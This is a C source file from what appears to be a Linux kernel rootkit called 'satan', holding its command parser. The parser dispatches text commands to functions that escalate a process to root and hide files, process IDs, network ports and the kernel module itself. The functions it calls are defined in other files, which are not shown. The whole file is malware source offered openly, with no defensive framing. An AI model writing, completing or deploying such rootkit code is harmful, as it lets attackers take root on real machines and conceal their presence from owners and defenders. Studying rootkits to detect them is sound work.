// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "command.h"

#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#include "file.h"
#include "module.h"
#include "port.h"
#include "privesc.h"
#include "proc.h"


#define CMD_PRIVESC     "privesc"
#define CMD_FILE_HIDE   "file_hide"
#define CMD_FILE_UNHIDE "file_unhide"
#define CMD_PROC_HIDE   "proc_hide"
#define CMD_PROC_UNHIDE "proc_unhide"
#define CMD_PORT_HIDE   "port_hide"
#define CMD_PORT_UNHIDE "port_unhide"
#define CMD_MOD_HIDE    "mod_hide"
#define CMD_MOD_UNHIDE  "mod_unhide"


#define CMD_RET_SUCCESS          0
#define CMD_RET_UNKNOWN_CMD      1
#define CMD_RET_INSUFFICIENT_ARG 2

#define DIE_IF_NO_ARG(arg)                      \
        if (!arg) {                             \
                ret = CMD_RET_INSUFFICIENT_ARG; \
                goto out;                       \
        }


#define CMD_SIZE 128
static char cmd[CMD_SIZE] = {0};
static char *arg = NULL;


/**
 * satan_command_parse() - Parses a user's command.
 * @cmd: user's command.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_command_parse(const char *s)
{
        int ret = CMD_RET_SUCCESS;

        memset(cmd, 0, CMD_SIZE);
        strncpy(cmd, s, CMD_SIZE);
        cmd[CMD_SIZE - 1] = 0;

        arg = strnchr(cmd, CMD_SIZE, ' ');
        
        if (arg)
                *arg++ = 0;
       

        pr_info("satan: command: received (%s,%s)\n", cmd, arg);

        // At this point:
        // 1. `cmd` points to the command string.
        // 2. `arg` points to the argument string.
        if (!strncmp(cmd, CMD_PRIVESC, CMD_SIZE)) {
                DIE_IF_NO_ARG(arg);
                satan_privesc_root(arg);

        } else if (!strncmp(cmd, CMD_FILE_HIDE, CMD_SIZE)) {
                DIE_IF_NO_ARG(arg);
                satan_file_hide(arg);

        } else if (!strncmp(cmd, CMD_FILE_UNHIDE, CMD_SIZE)) {
                DIE_IF_NO_ARG(arg);
                satan_file_unhide(arg);

        } else if (!strncmp(cmd, CMD_PROC_HIDE, CMD_SIZE)) {
                DIE_IF_NO_ARG(arg);
                satan_proc_hide(simple_strtoul(arg, NULL, 10));

        } else if (!strncmp(cmd, CMD_PROC_UNHIDE, CMD_SIZE)) {
                DIE_IF_NO_ARG(arg);
                satan_proc_unhide(simple_strtoul(arg, NULL, 10));

        } else if (!strncmp(cmd, CMD_PORT_HIDE, CMD_SIZE)) {
                DIE_IF_NO_ARG(arg);
                satan_port_hide(simple_strtoul(arg, NULL, 10));

        } else if (!strncmp(cmd, CMD_PORT_UNHIDE, CMD_SIZE)) {
                DIE_IF_NO_ARG(arg);
                satan_port_unhide(simple_strtoul(arg, NULL, 10));

        } else if (!strncmp(cmd, CMD_MOD_HIDE, CMD_SIZE)) {
                satan_module_hide();

        } else if (!strncmp(cmd, CMD_MOD_UNHIDE, CMD_SIZE)) {
                satan_module_unhide();

        } else {
                pr_info("satan: unknown command: %s\n", cmd);
                ret = CMD_RET_UNKNOWN_CMD;
        }

out:
        return ret;
}
